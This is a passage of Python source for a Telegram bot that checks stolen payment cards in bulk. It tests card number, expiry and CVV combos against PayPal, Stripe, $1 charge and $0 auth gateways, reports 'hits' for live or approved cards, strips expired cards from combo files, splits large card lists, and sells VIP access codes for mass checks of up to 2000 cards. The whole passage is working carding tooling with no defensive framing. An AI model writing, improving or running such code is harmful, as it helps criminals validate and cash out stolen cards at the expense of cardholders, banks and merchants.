• /rmkey [id] - Remove Stripe key

💎 VIP:
• Upload combo file - Mass checking (Max 2000)
• /st [card] - Stripe single
• /ch [card] - Charge 1$ single
• /auth [card] - Auth $0 check

🤖 FREE:
• /start - Start
• /cmds - Commands
• /pp [card] - PayPal single
• /st [card] - Stripe single
• /ch [card] - Charge 1$ single
• /auth [card] - Auth $0 check
• /clean - Clean cards file
• /parts [num] - Split file
• /stop - Stop mass
• /code [key] - Activate VIP"""
    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hit_counter, gateway_index
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
        return
    card_full = " ".join(context.args)
    gateway_num = 0
    gateway_url = None
    gateway_name = "PayPal"
    if GATEWAYS:
        gateway_num = (gateway_index % len(GATEWAYS)) + 1
        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
        gateway_index += 1
    status, response = await check_card_api(card_full, gateway_url)
    text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
    await update.message.reply_text(text, parse_mode="HTML")
    if status == "approved" or status == "live":
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        if status == "approved":
            status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
        else:
            status_text = "💵 Insufficient Funds"
        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)

async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        status_emoji = "🔥"
        status_text = "Charge"
    elif status == "live":
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
        gateway_info = f"\n🔗 Gate #{gateway_num}: <code>{gateway_url}</code>" if gateway_url else ""
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
        gateway_info = f"\n🔗 Gate #{gateway_num}" if gateway_num else ""
    else:
        user_status = "Free User 🤖"
        gateway_info = ""
    return premium_emoji(f"""💳 #PayPal [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status}){gateway_info}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")

async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        status_emoji = "🔥"
        status_text = "Charge $1"
    elif "INSUFFICIENT" in result_upper:
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    elif "LIVE" in result_upper:
        status_emoji = "💵"
        status_text = "Live"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""💳 #Stripe [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{result}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")

async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    status = result_dict.get('status', 'declined')
    message = result_dict.get('message', '')
    if status == "approved":
        status_emoji = "🔥"
        status_text = "Approved"
    elif status == "live":
        status_emoji = "💵"
        status_text = "Live"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""🛡 #Auth $0 [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{message}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")

async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    status = result_dict.get('status', 'declined')
    if status == "approved":
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), "Auth $0")

async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not STRIPE_KEYS:
        await update.message.reply_text(premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/st [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("💳 Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_stripe_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_stripe_response(card, result, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge", result, "Stripe")
    elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Stripe")

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS: return True
    if BANNED_USERS.get(user_id): return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
    return mode == "single"

async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text(premium_emoji("❌ File arrays require Premium."), parse_mode="HTML")
        return
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        card_count = 0
        for line in lines:
            if re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line):
                card_count += 1
        if user_id not in ADMINS and user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
            if card_count > VIP_FILE_LIMIT:
                await update.message.reply_text(premium_emoji(f"❌ Max {VIP_FILE_LIMIT} cards for VIP!\n📊 Your file: {card_count} cards"), parse_mode="HTML")
                try:
                    os.remove(file_path)
                except:
                    pass
                return
        pending_files[user_id] = {"file_path": file_path, "chat_id": chat_id}
        keyboard = [
            [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal")],
            [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe")],
            [InlineKeyboardButton("💳 Charge 1$ Check", callback_data="gateway_charge")],
            [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth")],
        ]
        await update.message.reply_text(premium_emoji(f"📁 File Received!\n💳 Cards: {card_count}\n\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    gateway_type = query.data.split("_")[1]
    if user_id not in pending_files:
        await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
        return
    user = query.from_user
    username = user.username or user.first_name or "Unknown"
    file_path = pending_files[user_id]["file_path"]
    chat_id = pending_files[user_id]["chat_id"]
    await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
    gateway_name_map = {
        "paypal": "PayPal",
        "stripe": "Stripe",
        "charge": "Charge 1$",
        "auth": "Auth $0"
    }
    gateway_name = gateway_name_map.get(gateway_type, "Unknown")
    if gateway_type == "paypal":
        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "stripe":
        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "charge":
        task = asyncio.create_task(charge_mass_run(file_path, chat_id, context, username))
    elif gateway_type == "auth":
        task = asyncio.create_task(process_auth_file(file_path, chat_id, context, gateway_name, username))
    user_tasks[user_id] = task
    del pending_files[user_id]

async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
    global gateway_index, hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        total_cards = 0
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards == 0:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
            return
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            gateway_num = 0
            gateway_url = None
            if GATEWAYS:
                gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
            status, response = await check_card_api(card_full, gateway_url)
            taken = round(time.time() - start_time, 2)
            if status == "approved":
                approved += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
            elif status == "live":
                live += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                status_text = "💵 Insufficient Funds"
                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔗 𝐆𝐚𝐭𝐞 #{gateway_num if gateway_num else 'N/A'}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
    global hit_counter
    if not STRIPE_KEYS:
        await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Stripe Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            keys_list = list(STRIPE_KEYS.keys())
            total_keys = len(keys_list)
            if total_keys == 0:
                await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
                return
            key_id = keys_list[(card_counter - 1) % total_keys]
            result = await loop.run_in_executor(None, check_stripe_sync, card_full, key_id)
            taken = round(time.time() - start_time, 2)
            result_upper = str(result).upper()
            if "CHARGE" in result_upper:
                approved += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge", result, gateway_name)
            elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                live += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔑 𝐊𝐞𝐲 #{key_id}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{result[:80]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0", username="Unknown"):
    global hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            result_dict = await loop.run_in_executor(None, check_auth_sync, card_full)
            taken = round(time.time() - start_time, 2)
            status = result_dict.get('status', 'declined')
            if status == "approved":
                approved += 1
                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), gateway_name)
            elif status == "live":
                live += 1
                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result_dict.get('message', ''), gateway_name)
            else:
                declined += 1
            message = result_dict.get('message', '')
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{message[:80]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Auth complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def stop_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("🛑 Stopping...")
    user_id = int(query.data.split("_")[2])
    stop_users[user_id] = True
    await query.edit_message_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")

async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /clean"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("🧹 Cleaning cards..."), parse_mode="HTML")
    try:
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/clean_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        total_lines = len(lines)
        valid_cards = []
        removed = 0
        current_year = datetime.now().year % 100
        current_month = datetime.now().month
        for line in lines:
            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                removed += 1
                continue
            card = match[0]
            parts = card.split("|")
            if len(parts) < 4:
                removed += 1
                continue
            try:
                exp_month = int(parts[1])
                exp_year = int(parts[2])
                if exp_year < 100:
                    exp_year += 2000
                if exp_month < 1 or exp_month > 12:
                    removed += 1
                    continue
                if exp_year < datetime.now().year:
                    removed += 1
                    continue
                elif exp_year == datetime.now().year and exp_month < current_month:
                    removed += 1
                    continue
                valid_cards.append(card)
            except:
                removed += 1
                continue
        clean_file_path = f"downloads/clean_result_{user_id}_{int(time.time())}.txt"
        with open(clean_file_path, 'w', encoding='utf-8') as f:
            for card in valid_cards:
                f.write(card + "\n")
        private_count = len(valid_cards)
        private_percentage = (private_count / total_lines * 100) if total_lines > 0 else 0
        result_text = f"""🧹 𝐂𝐥𝐞𝐚𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_lines}</code>
✅ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞: <code>{private_count}</code>
❌ 𝐏𝐮𝐛𝐥𝐢𝐜/𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
📈 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐩𝐞𝐫𝐜𝐞𝐧𝐭𝐚𝐠𝐞: <code>{private_percentage:.1f}%</code>
- - - - - - - - - - - - - - - -
🧹 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
✅ 𝐊𝐞𝐩𝐭: <code>{private_count}</code>
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        if private_count > 0:
            with open(clean_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"✅ Cleaned Cards ({private_count})"), parse_mode="HTML")
        try:
            os.remove(file_path)
            os.remove(clean_file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def parts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /parts [number]"), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/parts [number]</code>"), parse_mode="HTML")
        return
    try:
        num_parts = int(context.args[0])
        if num_parts < 2:
            await update.message.reply_text(premium_emoji("❌ Minimum parts is 2"), parse_mode="HTML")
            return
    except:
        await update.message.reply_text(premium_emoji("❌ Invalid number"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("📁 Splitting file..."), parse_mode="HTML")
    try:
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/parts_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        valid_cards = []
        for line in lines:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards < 1000:
            await msg.edit_text(premium_emoji(f"❌ Minimum file for split is 1000 cards!\n📊 Your file: {total_cards} cards"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        cards_per_part = total_cards // num_parts
        if cards_per_part < 1:
            await msg.edit_text(premium_emoji("❌ Too many parts for this file"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        result_text = f"""📁 𝐏𝐚𝐫𝐭𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
⚡ 𝐏𝐚𝐫𝐭𝐬: <code>{num_parts}</code>
⚡ 𝐋𝐢𝐧𝐞𝐬 𝐩𝐞𝐫 𝐩𝐚𝐫𝐭: <code>{cards_per_part}</code>
⚡ 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_cards}</code>
- - - - - - - - - - - - - - - -
⚡ 𝐁𝐲: @{username}
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        for i in range(num_parts):
            start_idx = i * cards_per_part
            end_idx = start_idx + cards_per_part if i < num_parts - 1 else total_cards
            part_cards = valid_cards[start_idx:end_idx]
            part_file_path = f"downloads/part_{i+1}_{user_id}_{int(time.time())}.txt"
            with open(part_file_path, 'w', encoding='utf-8') as f:
                for card in part_cards:
                    f.write(card + "\n")
            with open(part_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"📁 Part {i+1}/{num_parts} - {len(part_cards)} cards"), parse_mode="HTML")
            try:
                os.remove(part_file_path)
            except:
                pass
            await asyncio.sleep(1)
        try:
            os.remove(file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not context.args: return
    code = context.args[0].upper()
    if code not in CODES: return
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]: return
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(premium_emoji(f"🚀 VIP activated for {code_data['duration']} days."), parse_mode="HTML")

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
        code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
        CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
        await update.message.reply_text(premium_emoji(f"💰 Code: <code>{code}</code>"), parse_mode="HTML")
    except: pass

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    msg = "📊 Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• <code>{uid}</code> - <b>{status}</b>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    BANNED_USERS[int(context.args[0])] = True
    await update.message.reply_text(premium_emoji("✅ Banned."), parse_mode="HTML")

